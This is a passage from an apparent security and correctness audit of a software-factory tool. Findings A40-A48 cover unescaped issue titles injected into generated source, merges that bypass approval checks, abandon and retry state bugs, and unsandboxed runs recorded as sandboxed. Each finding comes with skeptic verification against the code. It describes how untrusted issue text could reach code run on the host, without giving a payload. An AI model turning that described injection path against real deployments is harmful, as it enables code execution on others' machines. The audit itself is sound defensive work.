an issue template applies them. Severity stays high.
2. I checked this against the code on main and the mechanism is real. Two of the cited line numbers are off. inbox() passes issue["title"] to intake() (foreman.py:191-196), and intake() stores title.strip() (foreman.py:161). _issue_refusal (foreman.py:205-210) only rejects an empty title and, when identity is on, checks the author's role. It never sanitizes the title. _scaffold builds values = {"{{title}}": item.title, ...} at foreman.py:944 (cited as 935) and applies raw text.replace(k, v) to every text file. golden_paths/python-fastapi/app/main.py:1 puts {{title}} inside a docstring and :7 has FastAPI(title="{{title}}"). tests/test_health.py:4 runs `from app.main import app`. In _do_build with runner None (get_runner("offline") returns None, agents.py), the build is scaffold-only (foreman.py:1362-1368). _containment sets build_where = "" at foreman.py:1405-1406 (cited as 1385-1387). _gate_executor returns self.executor unless build_where == "sandbox" (foreman.py:1435-1439), so the host runs the gates. factory.toml:100 lists "tests" in the poc gates and :106 sets tests = "uv run --quiet pytest -q", which imports the injected main.py on the host. A poc built on the host because the sandbox is not ready has the same exposure. Two things lower the severity, which is why I rate it medium rather than high. First, a human approves the spec and plan before `run`, and a title carrying a code payload is visible at those checkpoints. Second, with identity on, only authors holding the business role are imported. Even so, the title goes into the source with no escaping, so the defect stands.

### A40. Work item title is pasted unescaped into generated source and TOML

- **Location:** `src/factory/foreman.py:946` · **category:** robustness · **found:** medium · **verified:** medium · **finder:** claims
- **Failure scenario:** An issue titled `Le "bon" outil` is imported by `factory inbox`. The scaffolded pyproject.toml fails to parse, so the radar gate BLOCKs on 'unparseable'. app/main.py has a syntax error, so tests fail on every attempt; scaffold never clobbers, so retries cannot repair it. Issue text also reaches executable source.
- **Suggested fix:** Escape per target syntax (json.dumps for TOML/Python/TS string literals) or substitute only the slug and keep the title out of code.

**Evidence**

> _scaffold replaces {{title}} verbatim (935-948) into files such as golden_paths/python-fastapi/pyproject.toml:4 `description = "{{title}}"`, fullstack app/main.py:9 `FastAPI(title="{{title}}")` and web/src/App.tsx:5 `const TITLE = "{{title}}";`. Titles come from the CLI or from untrusted GitHub issue titles (foreman.py:183-188).

**Skeptic notes**

1. I could not refute this finding; the code confirms it. foreman.py:935 maps "{{title}}" to item.title, and lines 944-948 call plain str.replace on every file whose suffix is in TEXT_SUFFIXES (foreman.py:105-107, which includes .py, .toml and .tsx). There is no escaping anywhere in that path. intake() at foreman.py:145-152 only strips whitespace from the title. GitHub issue titles reach intake() unchanged through foreman.py:183-188, and the only check on them, _issue_refusal at foreman.py:197, rejects empty titles only. The templates contain the quoted placeholders the finding describes: golden_paths/python-fastapi/pyproject.toml:4 `description = "{{title}}"`, golden_paths/python-fastapi/app/main.py:7 and golden_paths/fullstack-react/app/main.py:9 `FastAPI(title="{{title}}")`, and golden_paths/fullstack-react/web/src/App.tsx:5. A title containing a double quote (or a backslash, or a newline) therefore produces invalid TOML, Python and TSX. A title containing `"""` also breaks the module docstring at main.py:1. foreman.py:941-942 skips any file that already exists, so a retry never re-scaffolds a broken file. Two parts of the scenario are not verified: that the radar gate reports "unparseable", and that no build agent edits the broken file. The core defect does not depend on either. Arbitrary issue text ending up in generated executable source is real, so medium severity is reasonable.
2. I could not refute it. In src/factory/foreman.py, _scaffold (around lines 935-948) builds values = {"{{title}}": item.title, ...}. For every file whose suffix is in TEXT_SUFFIXES (lines 107-110, which include .toml, .py and .tsx), it runs a plain text.replace(k, v). Nothing escapes the title. The only check on a title, in intake (148) and intake_change (269), is that it is not empty after strip(). The templates do put the title inside string literals: - python-fastapi/pyproject.toml:4 `description = "{{title}}"` - python-fastapi/app/main.py:7 and fullstack-react/app/main.py:9 `FastAPI(title="{{title}}")` - fullstack-react/web/src/App.tsx:5 `const TITLE = "{{title}}";`  The `factory inbox` import passes issue["title"] straight to intake (around lines 183-188). So a title containing a double quote produces invalid TOML, Python and TS. For the TOML file, detect.py:160-167 catches TOMLDecodeError and returns a Finding of kind "error" (the "unparseable manifest" kind), so the radar reports the manifest instead of reading its dependencies. The Python file is a syntax error.  The finding overstates one point. The claim that retries cannot repair the files is weak, because the build agent runs with edit tools and could rewrite main.py or pyproject.toml. Scaffold not clobbering existing files only means the template never gets re-applied.  The scenario takes ordinary input (a quoted word in an issue title), so this is a real robustness defect, and medium severity is fair.

### A41. A double quote or backslash in an issue title produces invalid pyproject.toml, so the item blocks permanently offline

- **Location:** `src/factory/foreman.py:947` · **category:** correctness · **found:** medium · **verified:** medium · **finder:** gap3-inbox-issue-to-workitem
- **Failure scenario:** A business issue titled `Rename "Clients" tab` (or `Export to C:\exports`) yields `description = "Rename "Clients" tab"`, invalid TOML (and `\e` is an invalid TOML escape). `uv run pytest`/`uv lock` fail to parse the project, the tests gate fails, the item is blocked, and every rerun keeps the broken file because the scaffold skips existing files. Same title also makes app/main.py:7 a Python SyntaxError.
- **Suggested fix:** Escape the title for the TOML/Python string context (json.dumps yields a valid TOML basic string and Python literal), or drop {{title}} from code files.

**Evidence**

> golden_paths/python-fastapi/pyproject.toml:4 is `description = "{{title}}"` (also python-worker and fullstack-react pyproject.toml); _scaffold replaces it with the raw title (foreman.py:946-947). In run(), a failed gate with runner None is not retried (foreman.py:336-345: retry only `self.runner is not None`), and _scaffold never rewrites an existing file (foreman.py:941-942: `if dest.exists(): continue`).

**Skeptic notes**

1. I could not refute it; the code behaves as the finding says, though its line numbers are slightly off. In src/factory/foreman.py, line 944 maps "{{title}}" to the raw item.title, and lines 953-957 run a plain text.replace on every file whose suffix is in TEXT_SUFFIXES. Line 117 shows that set includes .toml and .py, and nothing escapes the title. The title comes straight from intake or the issue title (lines 161 and 193), and the only check is that it is not empty (lines 157 and 206). The templates I read put {{title}} inside double-quoted strings: golden_paths/python-fastapi/pyproject.toml:4 is `description = "{{title}}"`, the same line appears in python-worker and fullstack-react, and app/main.py has `FastAPI(title="{{title}}")` at line 7, or line 9 for fullstack-react. A title such as `Rename "Clients" tab` therefore gives invalid TOML and a Python SyntaxError. Lines 950-951 skip files that already exist, so later runs keep the broken files. In run(), a failed gate is retried only when self.runner is not None (lines 345-352); otherwise the item is set to blocked. The offline build returns success after scaffolding only (lines 1366-1367). The repo config's sample poc gate list includes "tests" (`poc = ["radar", "secrets", "immutable", "tests"]`), so that gate fails on the broken project. With an agent runner the agent might repair the file on retry, so the block is permanent only offline, which is the case the finding describes. The cited line 947 points into _scaffold rather than at the exact replacement line (956); that does not change the substance.
2. I could not refute this finding. I read the code remotely and every link in the chain holds.  1. `_scaffold` (src/factory/foreman.py:944) maps `{{title}}` to the raw `item.title`, with no escaping, and does a plain `text.replace` at foreman.py:955-956. 2. The template contains `description = "{{title}}"` (golden_paths/python-fastapi/pyproject.toml) and `app = FastAPI(title="{{title}}")` (app/main.py). 3. Intake applies only `.strip()` to the title (foreman.py:161). Nothing validates or sanitizes quotes in it. 4. For maturity poc and above, the `tests` gate runs `uv run --quiet pytest -q` (factory.toml:100,106). `uv` must parse pyproject.toml first, so a title such as `Rename "Clients" tab` produces invalid TOML and the gate fails. The same title also breaks `FastAPI(title="...")` with a Python SyntaxError. 5. On a failed gate, `run()` retries only when `self.runner is not None` (foreman.py:~336-345). Offline the item becomes blocked. 6. A rerun does not repair the file: `_scaffold` skips any `dest` that already exists (foreman.py:950-951, "never clobber"), and the offline build is scaffold only (foreman.py:1367-1368).  With an agent runner, the agent might repair the file on retry. On the Claudo path, though, `uv lock` runs on the scaffold before the first commit (foreman.py:~1493-1497) and would also fail.  One part of the finding is weak: the backslash example. Whether `\e` is an invalid escape depends on the TOML version the parser accepts (TOML 1.1 adds `\e`). The double-quote case alone is enough to confirm the defect.  Severity stays medium: a common title character permanently blocks the documented offline mode.

### A42. Local merge fast-forwards commits that were never approved and marks them approved

- **Location:** `src/factory/foreman.py:1015` · **category:** governance · **found:** high · **verified:** medium · **finder:** foreman
- **Failure scenario:** IT approves ship_review (approved_head = X). Someone or a stray process then commits Y on factory/<slug>. `factory merge <slug> --as it` fast-forwards main to Y, and the app item's approved_head becomes Y, so a later `factory publish <app>` passes the tip == approved_head check on code that was never gated.
- **Suggested fix:** In merge(), require rev_parse(app, f"factory/{slug}") == item.approved_head (same rule and --accept-unverified escape as publish) before merge_fast_forward.

**Evidence**

> merge() (foreman.py:988-1022) checks role, kind, merged, pr_url, stage and publication, then calls merge_fast_forward(self.app_dir(item), item.slug) and _move_target_head(item, tip). It never compares the branch tip with item.approved_head. publish does that check in _verify_publishable (foreman.py:1060-1076). _move_target_head sets target.approved_head = tip (foreman.py:1205).

**Skeptic notes**

1. I could not refute this; the code shows the defect. In foreman.py:988-1022, merge() checks role, kind, merged, pr_url, stage == 'shipped' and the target's publication, then calls merge_fast_forward(self.app_dir(item), item.slug) at line 1015. It never compares the branch tip with item.approved_head. merge_fast_forward (project.py:273-293) only checks that the branch exists and the tree is clean, runs `git merge --ff-only factory/<slug>` and returns the new HEAD. It has no approval check either. Line 1020 then calls _move_target_head, which sets target.approved_head = tip at foreman.py:1205. The approved head is sealed when IT approves ship_review (foreman.py:448 and 477-486, or 1539/1592 on the Claudo path). Any commit added to factory/<slug> after that is fast-forwarded into the base branch and recorded as the app's approved_head. The publish path rejects exactly this case: _verify_publishable at foreman.py:1070 raises when tip != item.approved_head and says 'the code moved after the approval'. That shows the commit binding is intended, and merge skips it. A later publish of the parent app compares against the laundered approved_head, so the ungated commit would pass that check. I lowered the severity to medium because the scenario needs a local actor to commit on the change branch between approval and IT's own local merge, and merge is IT's explicit, manual act on a local, unpublished app.
2. Confirmed from the code. merge() (src/factory/foreman.py:988-1022) checks role, kind, merged, pr_url, stage == shipped and that the target is not published, then calls merge_fast_forward(self.app_dir(item), item.slug) at :1015. It never compares the branch tip with item.approved_head. merge_fast_forward (src/factory/project.py:273-292) checks only that the branch exists and the tree is clean, then runs `git merge --ff-only factory/<slug>`. It does not check approved_head either. _move_target_head (foreman.py:1198-1206) then sets target.approved_head = tip. Publishing has the check the merge path lacks: _verify_publishable raises "the code moved after the approval" when tip != item.approved_head (foreman.py:1070-1076). The approval seals approved_head at the ship_review head (_seal_approved_head, foreman.py:477-486; _finalize_with_claudo, :1539/:1592). After that, nothing re-checks it before a local merge. Scenario: IT approves the change at X. A commit Y lands on factory/<slug>. `factory merge --as it` fast-forwards main to Y, and the app item's approved_head becomes Y. A later `factory publish <app>` (the app is unpublished, which is the precondition for a local merge) then sees tip == approved_head and pushes Y, which was never gated. The tests cover only the base moving (test_change_flow.py:287, test_change_branches.py:94) and the approved_head move after a local merge (test_delivery.py:429). No test covers a change branch that moved after approval. I am lowering severity to medium: exploiting this needs someone with local write access to the app repo to commit on the change branch between approval and merge, and IT must still run the merge explicitly.

### A43. Second abandon succeeds on a change already merged on the host

- **Location:** `src/factory/foreman.py:1290` · **category:** state-machine · **found:** high · **verified:** medium · **finder:** foreman
- **Failure scenario:** `factory abandon X --as owner --reason r` sees the PR is MERGED: it saves pr_state=MERGED and raises. Running the same command again skips the host check (pr_state == MERGED), deletes the local branch via abandon_change and sets status=abandoned with merged=False. From then on `factory sync X` refuses (abandoned), so the local base is never fast-forwarded and the app's approved_head never moves to the merged tip.
- **Suggested fix:** In abandon(), refuse when item.pr_state == "MERGED" (in the same place as the item.merged check), or do not persist pr_state before raising.

**Evidence**

> _close_pull_request_for_abandon: `if state == "MERGED": item.pr_state = "MERGED"; self.store.save(item); raise FactoryError(... run factory sync, not abandon)` (foreman.py:1262-1267). abandon() only consults the host when `item.pr_url and item.pr_state != "MERGED"` (foreman.py:1290). sync() refuses abandoned items (foreman.py:1230-1231).

**Skeptic notes**

1. I could not refute this finding; the code reads exactly as described. In src/factory/foreman.py, `_close_pull_request_for_abandon` (lines 1262-1267) saves `pr_state="MERGED"` before raising the error. `abandon()` checks only `item.merged` at line 1283, and that flag is set only by sync (line 1238). It then asks the host only when `item.pr_state != "MERGED"` (line 1290). So running abandon a second time skips the host check. `abandon_change` (src/factory/project.py:312-322) then deletes the local factory branch, and the item is saved with `status="abandoned"` (lines 1296-1298). After that, sync refuses abandoned items (lines 1230-1231), so neither `sync_merged_base` nor `_move_target_head` (lines 1237-1239) ever runs. The docstring at line 1277 says a merged change is never abandoned, so this behavior is a defect, not a design choice. I lowered the severity to medium because the scenario only happens if the user ignores the error message, which tells them to run sync instead. Recovery also takes a manual store edit.
2. I read the code and the finding holds. In src/factory/foreman.py, when the PR is MERGED, _close_pull_request_for_abandon saves item.pr_state = "MERGED" before it raises (lines 1262-1267). abandon() only checks item.merged (line 1283) and only asks the host when `item.pr_url and item.pr_state != "MERGED"` (line 1290). item.merged is set only by sync() (lines 1236-1238). So a second `abandon` call loads the persisted pr_state=MERGED and skips the host check. It then reaches abandon_change (src/factory/project.py:312-322), which deletes factory/<slug> with -D whether or not the branch was merged, and sets status=abandoned (lines 1296-1298). After that, sync() refuses abandoned items (lines 1230-1231), so sync_merged_base and _move_target_head never run: the local base is not fast-forwarded and approved_head never moves. The only test, tests/test_delivery.py:513-518, checks just the first call, so retrying (a likely move after an error) is not covered. I lower the severity to medium: the error message already says to run sync, and this needs the user to repeat a refused abandon. The resulting state is wrong and nothing in the code recovers it.

### A44. Second `abandon` succeeds on a change whose PR was already merged on the host

- **Location:** `src/factory/foreman.py:1290` · **category:** delivery · **found:** medium · **verified:** medium · **finder:** execution
- **Failure scenario:** IT runs `factory abandon x --as it --reason ...`. The PR was merged, so the call fails and stores pr_state=MERGED. Someone runs the same command again: it passes, the local change branch is force-deleted, the item becomes 'abandoned', and `factory sync x` now errors forever. The local base never fast-forwards to the merged code, and the target's approved_head is never moved (_move_target_head is skipped).
- **Suggested fix:** Refuse to abandon whenever pr_state == 'MERGED' (the same rule as item.merged), or re-query the host every time.

**Evidence**

> _close_pull_request_for_abandon saves `item.pr_state = 'MERGED'` and raises (foreman.py:1262-1267). abandon then skips the host check whenever `item.pr_state == 'MERGED'` (foreman.py:1290 `if item.pr_url and item.pr_state != 'MERGED':`). It goes on to abandon_change, which deletes the branch with `-D` (project.py:322), and sets status 'abandoned'. sync then refuses abandoned items (foreman.py:1230-1231).

**Skeptic notes**

1. I could not refute it; the code does what the finding says. In foreman.py, `_close_pull_request_for_abandon` (around lines 1262-1267) handles a host state of MERGED this way: it sets `item.pr_state = "MERGED"`, saves with `self.store.save(item)`, then raises FactoryError. It does not set `item.merged`. On the next `abandon`, the only merged guard checks `item.merged` (around line 1282), so it passes. Line 1290 then reads `if item.pr_url and item.pr_state != "MERGED":`, which skips the host call entirely. Execution reaches `abandon_change` (project.py:312-322). That function switches to the base branch and runs `git branch -q -D factory/<slug>`, then the item is saved as 'abandoned'. After that, `sync` refuses the item (around lines 1230-1231: "was abandoned: there is nothing to sync"). As a result, `sync_merged_base` and `_move_target_head` never run, and the local base is not fast-forwarded to the merged PR. Within foreman.py's own code, the only path that leaves pr_state=MERGED with merged=False is the abandon error path. `sync` sets both values together. The second abandon is an ordinary retry, so this needs no unusual state. Medium severity fits: the local branch is lost and the target head goes stale, but the merged code still exists on the host.
2. I read the code remotely and it confirms the finding. In src/factory/foreman.py, `_close_pull_request_for_abandon` saves `item.pr_state = "MERGED"` and then raises, while `item.merged` stays False (lines 1262-1267). On the next call, `abandon` refuses only when `item.merged` is true. It then skips the host check because of `if item.pr_url and item.pr_state != "MERGED":` (line 1290). So it calls `abandon_change`, which force-deletes the branch with `git branch -q -D` (src/factory/project.py:322), and it sets the status to "abandoned". After that, `sync` raises "was abandoned" (foreman.py:1230-1231), so `sync_merged_base` and `_move_target_head` never run. Nothing else stores pr_state=MERGED while merged stays False: `sync` raises before `store.save` if the fast-forward fails. The test tests/test_delivery.py:511-518 covers only the first abandon call and never retries it. Severity is still medium: the second run only happens if someone ignores an error that tells them to run `factory sync`. But once it happens it cannot be undone through the CLI, and the target's approved_head stays stale.

### A45. Gate retry after a Claudo 'done' run replays Claudo instead of the targeted fix agent; path untested

- **Location:** `src/factory/foreman.py:1363` · **category:** untested-code-path · **found:** medium · **verified:** medium · **finder:** tests
- **Failure scenario:** An MVP plan with no CP passes plan-lint (warning only). Claudo returns `done`, then a factory gate (e.g. secrets) fails. Each retry calls _build_with_claudo again. Claudo resumes from state.json with every task done, changes nothing and returns `done`, and the gate fails again. That repeats max_build_attempts=3 times without any fix agent, and the item blocks with the agent never told about the gate report.
- **Suggested fix:** Add a test: ScriptedClaudo outcome [done], executor red then green, assert the second build uses the single-agent fix prompt. In src, track 'Claudo run completed' separately from claudo_cp.

**Evidence**

> foreman.py:1511-1513 sets `item.claudo_cp = ""` when Claudo finishes with no checkpoint. foreman.py:1363 `if self._uses_claudo(item) and (not item.claudo_cp or item.claudo_rejection): return self._build_with_claudo(...)`. The comment at :1360-1362 says a failed factory gate after a clean Claudo run is 'a targeted fix for one agent below'. The retry loop is at :336-343. ScriptedClaudo tests start from a `checkpoint` outcome (test_claudo_build.py:26-28), so gate-fail-then-retry after `done` is never exercised. Plan-lint only warns on a missing checkpoint (test_claudo_bridge.py:18).

**Skeptic notes**

1. I could not refute it; the code confirms the finding. In workitem.py:34-36 the step order is build, then gate, then ship_review, so the gate runs before any approval. On a gate failure, the retry block in foreman.py:336-343 sets the stage back to build while builds_this_run < max_build_attempts. In _do_build, foreman.py:1360-1364 sends the item to _build_with_claudo whenever `not item.claudo_cp`. The comment just above says a failed factory gate after a clean Claudo run should be a targeted fix for one agent. When Claudo finishes with outcome "done", foreman.py:1511-1513 sets item.claudo_cp = "", so every gate retry replays Claudo instead of calling the single-agent build_prompt(item, forbidden, item.feedback) at :1365-1366. The gate report never reaches Claudo: run_build (:1496-1498) receives only _claudo_env, which holds approval and budget settings (:1426-1436), and not item.feedback. A plan with no checkpoint can reach the build: Claudo's plan-lint only warns on "no checkpoint" (test_claudo_bridge.py:18-19 expects ok with 2 warnings), and _write_plan blocks only on lint errors (foreman.py:765-772). The intent described in the comment works only when a checkpoint exists. I found no test in tests/ whose ScriptedClaudo starts from a "done" outcome; the default outcome is a checkpoint (test_claudo_build.py:27). Severity stays medium: the trigger needs a plan without a checkpoint, which plan-lint flags only as a warning, and the result is wasted build attempts followed by a blocked item, not a wrong ship.
2. I could not refute this finding; the code confirms it. foreman.py:1512 sets `item.claudo_cp = ""` when Claudo returns `done`. In `_do_build`, foreman.py:1363 sends any item with an empty claudo_cp back to `_build_with_claudo`, even though the comment just above it says a failed factory gate after a clean Claudo run should get a targeted fix from one agent. A `done` run is a clean run, so that comment is not honoured. The same condition appears at foreman.py:969 in the change build path. The retry loop at foreman.py:336-343 sets stage=build/active and rebuilds while builds_this_run < max_build_attempts. Claudo never receives the gate report: `_claudo_env` (foreman.py:1426-1436) passes only the approval secret, nonce, budget and sandbox variables, and `item.feedback` is used only by the single-agent `build_prompt` path. Each retry therefore reruns Claudo with no knowledge of why the gate failed. The test suite never exercises this path. `ScriptedClaudo` defaults to a `checkpoint` outcome (tests/test_claudo_build.py:24-26). The targeted-fix test `test_a_factory_gate_failure_after_claudo_gets_a_targeted_fix_not_a_replay` (tests/test_claudo_build.py:181-190) uses that default, so claudo_cp is non-empty when the gate fails. One part I could not check: whether Claudo, resumed with every task done, changes nothing. That depends on the external engine. Even so, it gets no gate feedback, so a retry cannot fix the failure, and the item blocks after the configured attempts without the fix agent ever running.

### A46. --unsafe-host given at approve/run after a sandboxed build silently moves gates and Claudo's final run to the host, with no ack

- **Location:** `src/factory/foreman.py:1417` · **category:** containment · **found:** medium · **verified:** medium · **finder:** execution
- **Failure scenario:** An MVP is built in the sandbox and paused at plan or ship review. The owner runs `factory approve <slug> --as owner --unsafe-host` (or `run --unsafe-host` after a gate retry). The gates then run agent-written tests on the host via shell_executor, and _finalize_with_claudo runs Claudo's last tasks and evals without LAB_RUNNER=sandbox, all on the host. build_where still says 'sandbox' and the PR body claims 'Agent code ran in: sandbox' (foreman.py:1149-1155). No unsafe_host ack reaches IT.
- **Suggested fix:** In _gate_executor/_claudo_env, refuse when build_where == 'sandbox' and the sandbox is absent, or downgrade build_where to 'host' and _add_ack('unsafe_host', ...) whenever agent code is about to run on the host, not only in _do_build.

**Evidence**

> cli.py:36-39 builds no Sandbox when `--unsafe-host` is passed, and approve/run/promote accept it (cli.py:457, 464, 487). item.build_where is decided only at the build step (foreman.py:323-324 -> _containment). _gate_executor (foreman.py:1417-1419) and _claudo_env (foreman.py:1434) fall back to the host when `self.sandbox is None`, even when build_where == 'sandbox'. The unsafe_host ack is added only inside _do_build (foreman.py:1345-1349).

**Skeptic notes**

1. I confirmed this from the code, with one correction. --unsafe-host is added by runner_opt (cli.py:391-399), and approve, run and promote all use it. With the flag, _foreman builds no Sandbox (cli.py:36-39). item.build_where is set only by _containment (foreman.py:1380-1400), and the run loop calls _containment only for the build step (foreman.py:322-327). _gate_executor (foreman.py:1415-1419) and _claudo_env (foreman.py:1434) fall back to the host when self.sandbox is None, even when build_where == 'sandbox'. The unsafe_host ack is added only in _do_build (foreman.py:1345-1349).  Correction: the plan_review case in the finding is wrong. After a plan approval the next step is build (workitem.py:33-34). The build step calls _containment, which sets build_where='host' (foreman.py:1388-1390), and _do_build then adds the ack. That path is handled.  Two paths do reproduce the defect: (1) A ship_review approval with --unsafe-host on a Claudo item. approve() calls _finalize_with_claudo (foreman.py:436-437), which runs engine.run_build with env=self._claudo_env(item) (foreman.py:1555). That env has no sandbox variables, so Claudo's final tasks and evals run on the host. build_where is still 'sandbox', so the PR body says 'sandbox (container, egress allowlist)' (foreman.py:1149-1155), and no unsafe_host ack is added. (2) A gate blocked after its retries, then resumed with `run --unsafe-host`. The run loop resumes at stage gate without calling _containment, so _do_gate uses _gate_executor (foreman.py:1651), which returns the host executor while build_where still says 'sandbox'.  The human opted in with the flag. But the flag's help text says "build on the host", and the audit record (PR body and ship_acks) is wrong. That is a containment and audit defect, not just style.
2. I could not refute this. I read every file it cites remotely, and the code does what the finding says.  - **No sandbox under the flag.** cli.py:36-39 builds no Sandbox when --unsafe-host is passed. runner_opt (cli.py:391-399) adds that flag to run, approve and promote. Its help text says "recorded for IT to acknowledge". - **build_where is only set at build time.** _containment (foreman.py:1380-1400) sets item.build_where only when a build step runs (foreman.py:322-323). The unsafe_host ack is added only in _do_build (foreman.py:1345-1349). - **Silent host fallback.** _gate_executor (foreman.py:1415-1419) and _claudo_env (foreman.py:1434) quietly drop to the host executor and the host env when sandbox is None. They do this even when build_where == "sandbox".  Paths that confirm the finding:  1. **Ship review.** approve at ship_review (foreman.py:433-436) calls _finalize_with_claudo, which runs engine.run_build with env=self._claudo_env(item) (foreman.py:1551-1556). Under --unsafe-host that env carries no sandbox settings, so Claudo's last tasks and evals run on the host. No ack is added, and build_where still reads "sandbox". 2. **Gate retry.** run --unsafe-host on an item blocked at the gate stage calls _do_gate -> _gate_executor (foreman.py:1651), so agent-written gate commands run through the host executor.  In both cases the PR body (foreman.py:1149-1155) still says the agent code ran in the sandbox.  One part of the finding is wrong. The plan_review case is not a bug. After approval the build step runs again, _containment then sets build_where to "host", and the ack is recorded.  I kept severity at medium. The operator has to pass the flag on purpose, but the record IT relies on ends up false: build_where and the PR body say sandbox, and no unsafe_host ack is recorded.

### A47. approve --unsafe-host runs the final Claudo run unsandboxed while the item still records 'sandbox'

- **Location:** `src/factory/foreman.py:1434` · **category:** security · **found:** medium · **verified:** medium · **finder:** foreman
- **Failure scenario:** `factory approve X --as it --unsafe-host` on an MVP item built in the sandbox: Claudo's post-approval nodes and evals execute on the host, and the PR body and the item tell reviewers the code ran in the sandbox. In the reverse case, a sandbox that has since become unready is still configured without checking problems(), so the final run fails and the ship is blocked.
- **Suggested fix:** In _finalize_with_claudo, re-run _containment-like logic, and add an unsafe_host ack plus build_where='host' when the sandbox is absent, or refuse when the build was sandboxed.

**Evidence**

> _claudo_env adds sandbox settings only `if item.build_where == "sandbox" and self.sandbox is not None` (1434-1435). With --unsafe-host the CLI passes sandbox=None (cli.py:36-39), and approve accepts --unsafe-host (cli.py:464, runner_opt). _finalize_with_claudo runs run_build(stop_at_checkpoint=False) with that env (1551-1557) and records no ack, while build_where stays 'sandbox'. _pr_body states 'Agent code ran in: sandbox' (1149-1155).

**Skeptic notes**

1. The code confirms the finding. src/factory/foreman.py:1434-1435 (_claudo_env) adds sandbox settings only when `item.build_where == "sandbox" and self.sandbox is not None`. cli.py:36-39 sets sandbox=None whenever --unsafe-host is passed, and the `approve` command accepts that flag through runner_opt (cli.py:460-465, defined at 391-399). The flag's help text says "recorded for IT to acknowledge".  At ship_review, approve() calls _finalize_with_claudo (foreman.py:435-436) before any run(). _finalize_with_claudo (1520-1557) signs the approval and calls engine.run_build(stop_at_checkpoint=False, env=self._claudo_env(item)). Nothing in that path calls _containment. The only call to _containment is at the build step (foreman.py:322-323). The only place that adds an unsafe_host ack is _do_build (1345-1349).  So with --unsafe-host on approve, Claudo's final run gets no sandbox env and runs on the host. No ack is recorded, build_where stays "sandbox", and the PR body's "Agent code ran in" line (1149-1155) would still say sandbox. The finding's secondary case also holds: _finalize never checks sandbox.problems(), unlike _containment (1391), so a sandbox that is no longer ready is still configured for the final run.  It takes an explicit flag to trigger, but the containment record ends up false and the promised IT acknowledgement is skipped. Medium severity stands.
2. Not refuted: the code I read confirms the finding. `factory approve` accepts `--unsafe-host` (cli.py:461-465 calls runner_opt, which adds the flag at cli.py:395-399). With that flag, `_foreman` passes sandbox=None (cli.py:36-39). In approve, the ship_review branch with claudo_cp calls `_finalize_with_claudo` (foreman.py:435-436). That function runs `engine.run_build(stop_at_checkpoint=False, env=self._claudo_env(item))` (foreman.py:1551-1557). `_claudo_env` adds `sandbox.claudo_env()` (LAB_RUNNER=sandbox, sandbox.py:116-124) only when `item.build_where == "sandbox" and self.sandbox is not None` (foreman.py:1434-1435). So Claudo's final run gets no sandbox settings, and its agents and verify/evals run on the host. `_containment`, which re-sets build_where and records the decision, is called only for the build step (foreman.py:322-323). The `unsafe_host` ack is added only in `_do_build` (foreman.py:1345-1349). On this path build_where stays "sandbox", no ack is recorded, and `_pr_body` prints "Agent code ran in: sandbox" (foreman.py:1149-1155). The reverse case also holds: `_finalize_with_claudo` never calls `sandbox.problems()`, so a sandbox that is no longer ready is still configured for the final run. The operator does opt in with `--unsafe-host`, which lowers exploitability, but the audit record and the PR body still give reviewers a false containment claim. Medium is fair.

### A48. `approve --unsafe-host` at ship review runs Claudo's final run unsandboxed and records nothing

- **Location:** `src/factory/foreman.py:1434` · **category:** security · **found:** medium · **verified:** medium · **finder:** claims
- **Failure scenario:** An MVP item is built in the sandbox. IT runs `factory approve x --as it --unsafe-host`. Claudo's final run (reviewer re-run, any reworked tasks, evals) executes on the host next to the signing secret. The PR still says 'Agent code ran in: sandbox', and there is no ack or log entry.
- **Suggested fix:** At ship_review, refuse --unsafe-host for items with build_where=='sandbox' or log it and add the ack; derive Claudo's containment from item.build_where, not from the CLI flag.

**Evidence**

> _claudo_env only adds sandbox env when `item.build_where == "sandbox" and self.sandbox is not None` (1434-1435). With --unsafe-host the CLI passes sandbox=None (cli.py:36-39). _finalize_with_claudo then runs the post-approval orchestrator (1551-1557) with LAB_APPROVAL_SECRET in env (1428) and agents on the host. The unsafe_host ack is only added in _do_build (1345-1349), which does not run at approval. README.md:138-139 says --unsafe-host on approve 'puts an unsafe_host acknowledgement on the item'.

**Skeptic notes**

1. I could not refute this from the code; every link in the chain checks out. `approve` gets `--unsafe-host`: `runner_opt(sp)` is applied to the approve parser (cli.py:460-464), and `runner_opt` defines the flag (cli.py:391-399). With the flag set, `_foreman` builds the Foreman with `sandbox=None` (cli.py:36-50). At `ship_review`, `approve` calls `_finalize_with_claudo` (foreman.py:435-436), which runs `engine.run_build(..., stop_at_checkpoint=False, env=self._claudo_env(item))`. `_claudo_env` puts `LAB_APPROVAL_SECRET` in env (foreman.py:1428) and only adds the sandbox env when `item.build_where == "sandbox" and self.sandbox is not None` (foreman.py:1434-1435). With `sandbox=None`, Claudo's post-checkpoint run (agents, verify, evals) therefore runs on the host with the signing secret in its environment. The only place `unsafe_host` records anything is `_do_build` (foreman.py:1345-1349), and the approve path does not call it. `item.build_where` stays "sandbox", so the PR body still says "Agent code ran in: sandbox" (foreman.py:1149-1155). README.md:138-139 says `--unsafe-host` on approve puts an `unsafe_host` acknowledgement on the item, and that does not happen here. Severity stays medium: IT has to pass the flag on purpose, but the containment is silently lost and the record is wrong.
2. I read the code remotely and it confirms the finding.  - cli.py:36-39: when `--unsafe-host` is passed, `sandbox` is set to None. - cli.py:201-203: `cmd_approve` builds the Foreman through `_foreman(args, ...)`. - cli.py:396: the `--unsafe-host` option is registered through `runner_opt`, which `approve` uses. - foreman.py:435-436: at ship_review, `approve` calls `_finalize_with_claudo` when a Claudo checkpoint is pending. It does not go through `_containment` or `_do_build` first. - foreman.py:1553-1557: `_finalize_with_claudo` runs `engine.run_build(..., stop_at_checkpoint=False, env=self._claudo_env(item))`. - foreman.py:1434: `_claudo_env` adds `sandbox.claudo_env()` only when `build_where == "sandbox" and self.sandbox is not None`. That function (sandbox.py:116-124) sets LAB_RUNNER=sandbox and the related variables. With `sandbox` set to None, Claudo's final run (remaining tasks, verify and evals) runs on the host, with LAB_APPROVAL_SECRET in its environment (foreman.py:1428). - foreman.py:1345-1349: the `unsafe_host` ack and log entry are only added on the build path. Nothing in `approve` or `_finalize` adds them. - `item.build_where` stays "sandbox", so the PR body built at foreman.py:1149-1155 still says "Agent code ran in: sandbox". - README.md:138-139 promises that `--unsafe-host` on `approve` records an `unsafe_host` acknowledgement, and that does not happen here.
